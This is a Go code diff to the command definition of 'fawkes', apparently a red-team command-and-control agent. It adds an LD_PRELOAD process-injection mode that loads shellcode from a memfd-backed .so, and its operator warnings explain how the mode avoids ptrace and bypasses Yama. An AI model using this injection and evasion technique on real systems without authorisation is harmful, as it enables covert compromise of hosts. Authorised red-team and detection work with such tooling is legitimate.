@@ -15,9 +15,9 @@ func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "vanilla-injection",
 		Description:         "Perform vanilla remote process injection (inject shellcode or migrate agent into another process)",
-		HelpString:          "vanilla-injection -action inject -pid 1234 -filename shellcode.bin\nvanilla-injection -action migrate -pid 1234 -filename fawkes-shellcode.bin",
-		Version:             2,
-		MitreAttackMappings: []string{"T1055.001", "T1055.002", "T1055.009"}, // DLL Injection, PE Injection, Proc Memory
+		HelpString:          "vanilla-injection -action inject -pid 1234 -filename shellcode.bin\nvanilla-injection -action migrate -pid 1234 -filename fawkes-shellcode.bin\nvanilla-injection -action ldpreload -target /usr/bin/id -filename shellcode.bin (Linux, no ptrace)",
+		Version:             3,
+		MitreAttackMappings: []string{"T1055.001", "T1055.002", "T1055.009", "T1574.006"}, // DLL Injection, PE Injection, Proc Memory, LD_PRELOAD
 		SupportedUIFeatures: []string{"process_browser:inject"},
 		Author:              "@galoryber",
 		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "vanillainjection_new.js"), Author: "@galoryber"},
@@ -29,8 +29,8 @@ func init() {
 				Name:             "action",
 				ModalDisplayName: "Action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Description:      "inject: inject shellcode into target process. migrate: inject agent shellcode and exit current process (process migration)",
-				Choices:          []string{"inject", "migrate"},
+				Description:      "inject: ptrace + /proc/mem injection. migrate: inject + exit current process. ldpreload: Linux-only, spawn process with LD_PRELOAD .so (no ptrace, bypasses Yama)",
+				Choices:          []string{"inject", "migrate", "ldpreload"},
 				DefaultValue:     "inject",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -166,7 +166,16 @@ func init() {
 			action, _ := taskData.Args.GetStringArg("action")
 			os := taskData.Callback.OS
 			var msg string
-			if strings.EqualFold(os, "linux") {
+			if strings.EqualFold(action, "ldpreload") {
+				target, _ := taskData.Args.GetStringArg("target")
+				if target == "" {
+					target = "/usr/bin/id"
+				}
+				msg = fmt.Sprintf("OPSEC WARNING: LD_PRELOAD injection spawning %s. "+
+					"Builds minimal ELF .so with DT_INIT pointing to shellcode, written "+
+					"to anonymous memfd. No ptrace used — bypasses Yama ptrace_scope. "+
+					"Artifacts: /proc/PID/maps shows (deleted) memfd entry.", target)
+			} else if strings.EqualFold(os, "linux") {
 				msg = fmt.Sprintf("OPSEC WARNING: /proc/PID/mem injection into PID %s. "+
 					"Uses ptrace attach + /proc/mem direct write — avoids PTRACE_POKETEXT "+
 					"but still requires ptrace capability. Yama LSM and seccomp may block.", pid)
